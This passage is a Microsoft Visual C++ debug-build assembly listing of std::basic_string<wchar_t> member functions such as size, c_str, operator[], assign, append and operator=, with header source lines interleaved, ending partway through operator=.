;	COMDAT ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 224
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size, COMDAT

; 4161 :     _NODISCARD _CONSTEXPR20 size_type size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4162 :         return _Mypair._Myval2._Mysize;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]

; 4163 :     }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 224
?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length, COMDAT

; 4157 :     _NODISCARD _CONSTEXPR20 size_type length() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4158 :         return _Mypair._Myval2._Mysize;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]

; 4159 :     }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 224
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str, COMDAT

; 4143 :     _NODISCARD _CONSTEXPR20 _Ret_z_ const _Elem* c_str() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4144 :         return _Mypair._Myval2._Myptr();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr

; 4145 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Off$ = 232
??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[], COMDAT

; 4060 :     _NODISCARD _CONSTEXPR20 reference operator[](const size_type _Off) noexcept /* strengthened */ {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4061 : #if _CONTAINER_DEBUG_LEVEL > 0
; 4062 :         _STL_VERIFY(_Off <= _Mypair._Myval2._Mysize, "string subscript out of range");
; 4063 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 4064 :         return _Mypair._Myval2._Myptr()[_Off];

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8b c8	 mov	 rcx, rax
  0002e	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00033	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Off$[rbp]
  0003a	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]

; 4065 :     }

  0003e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00045	5f		 pop	 rdi
  00046	5d		 pop	 rbp
  00047	c3		 ret	 0
??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[]
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
_Old_ptr$1 = 8
$T2 = 228
$T3 = 260
this$ = 320
_Ptr$ = 328
_Count$ = 336
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00029	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  00034	48 39 85 50 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  0003b	77 6c		 ja	 SHORT $LN2@assign

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0003d	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b c8	 mov	 rcx, rax
  00047	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0004c	48 89 45 08	 mov	 QWORD PTR _Old_ptr$1[rbp], rax

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00050	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00057	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005e	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);

  00062	4c 8b 85 50 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00069	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00070	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_ptr$1[rbp]
  00074	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00079	33 c0		 xor	 eax, eax
  0007b	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00082	48 8b 45 08	 mov	 rax, QWORD PTR _Old_ptr$1[rbp]
  00086	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0008d	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00091	48 8d 95 e4 00
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  00098	48 8b c8	 mov	 rcx, rax
  0009b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3418 :             _ASAN_STRING_CREATE(*this);
; 3419 :             return *this;

  000a0	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000a7	eb 35		 jmp	 SHORT $LN1@assign
$LN2@assign:

; 3420 :         }
; 3421 : 
; 3422 :         return _Reallocate_for(

  000a9	48 8d 85 04 01
	00 00		 lea	 rax, QWORD PTR $T3[rbp]
  000b0	48 8b f8	 mov	 rdi, rax
  000b3	33 c0		 xor	 eax, eax
  000b5	b9 01 00 00 00	 mov	 ecx, 1
  000ba	f3 aa		 rep stosb
  000bc	4c 8b 8d 48 01
	00 00		 mov	 r9, QWORD PTR _Ptr$[rbp]
  000c3	44 0f b6 85 04
	01 00 00	 movzx	 r8d, BYTE PTR $T3[rbp]
  000cb	48 8b 95 50 01
	00 00		 mov	 rdx, QWORD PTR _Count$[rbp]
  000d2	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d9	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN1@assign:

; 3423 :             _Count,
; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {
; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);
; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());
; 3427 :             },
; 3428 :             _Ptr);
; 3429 :     }

  000de	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000e5	5f		 pop	 rdi
  000e6	5d		 pop	 rbp
  000e7	c3		 ret	 0
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
_Old_size$ = 8
_Old_ptr$1 = 40
$T2 = 260
$T3 = 292
this$ = 352
_Ptr$ = 360
_Count$ = 368
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT

; 3304 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 78 01
	00 00		 sub	 rsp, 376		; 00000178H
  00018	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3305 :         // append [_Ptr, _Ptr + _Count)
; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00029	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  00034	48 89 45 08	 mov	 QWORD PTR _Old_size$[rbp], rax

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00038	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003f	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_size$[rbp]
  00043	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  00047	48 2b c1	 sub	 rax, rcx
  0004a	48 39 85 70 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00051	0f 87 8b 00 00
	00		 ja	 $LN2@append

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00057	48 8b 85 70 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0005e	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_size$[rbp]
  00062	48 03 c8	 add	 rcx, rax
  00065	48 8b c1	 mov	 rax, rcx
  00068	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006f	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 3310 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  00073	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0007a	48 8b c8	 mov	 rcx, rax
  0007d	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00082	48 89 45 28	 mov	 QWORD PTR _Old_ptr$1[rbp], rax

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  00086	48 8b 45 28	 mov	 rax, QWORD PTR _Old_ptr$1[rbp]
  0008a	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_size$[rbp]
  0008e	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00092	4c 8b 85 70 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00099	48 8b 95 68 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  000a0	48 8b c8	 mov	 rcx, rax
  000a3	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  000a8	33 c0		 xor	 eax, eax
  000aa	66 89 85 04 01
	00 00		 mov	 WORD PTR $T2[rbp], ax
  000b1	48 8b 85 70 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  000b8	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_size$[rbp]
  000bc	48 03 c8	 add	 rcx, rax
  000bf	48 8b c1	 mov	 rax, rcx
  000c2	48 8b 4d 28	 mov	 rcx, QWORD PTR _Old_ptr$1[rbp]
  000c6	48 8d 04 41	 lea	 rax, QWORD PTR [rcx+rax*2]
  000ca	48 8d 95 04 01
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  000d1	48 8b c8	 mov	 rcx, rax
  000d4	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3313 :             return *this;

  000d9	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000e0	eb 41		 jmp	 SHORT $LN1@append
$LN2@append:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  000e2	48 8d 85 24 01
	00 00		 lea	 rax, QWORD PTR $T3[rbp]
  000e9	48 8b f8	 mov	 rdi, rax
  000ec	33 c0		 xor	 eax, eax
  000ee	b9 01 00 00 00	 mov	 ecx, 1
  000f3	f3 aa		 rep stosb
  000f5	48 8b 85 70 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  000fc	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00101	4c 8b 8d 68 01
	00 00		 mov	 r9, QWORD PTR _Ptr$[rbp]
  00108	44 0f b6 85 24
	01 00 00	 movzx	 r8d, BYTE PTR $T3[rbp]
  00110	48 8b 95 70 01
	00 00		 mov	 rdx, QWORD PTR _Count$[rbp]
  00117	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011e	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
$LN1@append:

; 3317 :             _Count,
; 3318 :             [](_Elem* const _New_ptr, const _Elem* const _Old_ptr, const size_type _Old_size, const _Elem* const _Ptr,
; 3319 :                 const size_type _Count) {
; 3320 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);
; 3321 :                 _Traits::copy(_New_ptr + _Old_size, _Ptr, _Count);
; 3322 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());
; 3323 :             },
; 3324 :             _Ptr, _Count);
; 3325 :     }

  00123	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  0012a	5f		 pop	 rdi
  0012b	5d		 pop	 rbp
  0012c	c3		 ret	 0
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
_TEXT	SEGMENT
this$ = 224
_Right$ = 232
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append, COMDAT

; 3276 :     _CONSTEXPR20 basic_string& append(const basic_string& _Right) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b c8	 mov	 rcx, rax
  0002e	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  00033	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0003a	4c 8b 41 10	 mov	 r8, QWORD PTR [rcx+16]
  0003e	48 8b d0	 mov	 rdx, rax
  00041	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00048	e8 00 00 00 00	 call	 ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append

; 3278 :     }

  0004d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00054	5f		 pop	 rdi
  00055	5d		 pop	 rbp
  00056	c3		 ret	 0
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
_TEXT	SEGMENT
_Al$ = 8
_Right_al$ = 40
this$ = 288
_Right$ = 296
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3188 :     _CONSTEXPR20 basic_string& operator=(const basic_string& _Right) {

$LN4:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3189 :         if (this == _STD addressof(_Right)) {

  00024	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
  00030	48 39 85 20 01
	00 00		 cmp	 QWORD PTR this$[rbp], rax
  00037	75 09		 jne	 SHORT $LN2@operator

; 3190 :             return *this;

  00039	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00040	eb 5d		 jmp	 SHORT $LN1@operator
$LN2@operator:

; 3191 :         }
; 3192 : 
; 3193 :         auto& _Al             = _Getal();

  00042	48 8b 8d 20 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0004e	48 89 45 08	 mov	 QWORD PTR _Al$[rbp], rax

; 3194 :         const auto& _Right_al = _Right._Getal();

  00052	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00059	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0005e	48 89 45 28	 mov	 QWORD PTR _Right_al$[rbp], rax

; 3195 :         if constexpr (_Choose_pocca_v<_Alty>) {
; 3196 :             if (_Al != _Right_al) {
; 3197 :                 auto&& _Alproxy       = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 3198 :                 auto&& _Right_alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Right_al);
; 3199 :                 _Container_proxy_ptr<_Alty> _New_proxy(_Right_alproxy, _Leave_proxy_unbound{}); // throws
; 3200 : 
; 3201 :                 const size_type _Right_size   = _Right._Mypair._Myval2._Mysize;
; 3202 :                 const _Elem* const _Right_ptr = _Right._Mypair._Myval2._Myptr();
; 3203 :                 if (_Right_size > _Small_string_capacity) {
; 3204 :                     size_type _New_capacity = _Calculate_growth(_Right_size, _Small_string_capacity, _Right.max_size());
; 3205 :                     auto _Right_al_non_const = _Right_al;
; 3206 :                     const pointer _New_ptr   = _Allocate_for_capacity(_Right_al_non_const, _New_capacity); // throws
; 3207 :                     _Traits::copy(_Unfancy(_New_ptr), _Right_ptr, _Right_size + 1);
; 3208 : 
; 3209 :                     _Tidy_deallocate();
; 3210 :                     _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);
; 3211 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3212 :                     _Mypair._Myval2._Myres  = _New_capacity;
; 3213 :                     _ASAN_STRING_CREATE(*this);
; 3214 :                 } else {
; 3215 :                     _Tidy_deallocate();
; 3216 :                     _Traits::copy(_Mypair._Myval2._Bx._Buf, _Right_ptr, _Right_size + 1);
; 3217 :                     _Mypair._Myval2._Mysize = _Right_size;
; 3218 :                     _Mypair._Myval2._Myres  = _Small_string_capacity;
; 3219 :                 }
; 3220 : 
; 3221 :                 _Pocca(_Al, _Right_al);
; 3222 :                 _New_proxy._Bind(_Alproxy, _STD addressof(_Mypair._Myval2));
; 3223 :                 return *this;
; 3224 :             }
; 3225 :         }
; 3226 : 
; 3227 :         _Pocca(_Al, _Right_al);

  00062	48 8b 55 28	 mov	 rdx, QWORD PTR _Right_al$[rbp]
  00066	48 8b 4d 08	 mov	 rcx, QWORD PTR _Al$[rbp]
  0006a	e8 00 00 00 00	 call	 ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ; std::_Pocca<std::allocator<wchar_t> >

; 3228 :         assign(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0006f	48 8b 85 28 01
